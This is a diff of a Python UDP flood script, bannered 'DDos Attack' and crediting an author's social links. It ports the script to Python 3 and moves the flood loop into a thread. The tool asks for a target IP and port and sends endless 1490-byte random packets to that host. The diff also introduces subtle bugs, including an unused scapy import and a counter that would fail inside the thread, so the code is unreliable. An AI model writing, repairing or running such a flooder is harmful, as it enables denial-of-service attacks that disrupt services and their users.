@@ -2,7 +2,9 @@ import sys
 import os
 import time
 import socket
+import scapy.all as scapy
 import random
+import threading
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -17,35 +19,43 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
-os.system("figlet DDos Attack")
+os.system("cls")
+print("figlet DDos Attack")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print("Author: HA-MRX")
+print("YouTube: https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
+print("Github: https://github.com/Ha3MrX")
+print("Facebook: https://www.facebook.com/muhamad.jabar222")
 print
-ip = raw_input("IP Target : ")
+ip = input("IP Target : ")
 port = input("Port       : ")
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
+os.system("cls")
+print("Figlet Attack Starting")
+print("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+os.system("cls")
+print("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+os.system("cls")
+print("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+os.system("cls")
+print("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+os.system("cls")
+print("[====================] 100%")
 time.sleep(3)
+#why are you adding delay?
 sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+
+
+def send():
+    while True:
+        sock.sendto(bytes, (ip,int(port)))
+        sent = sent + 1 
+        print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+  
+threading.Thread(target=send).start()
+
 
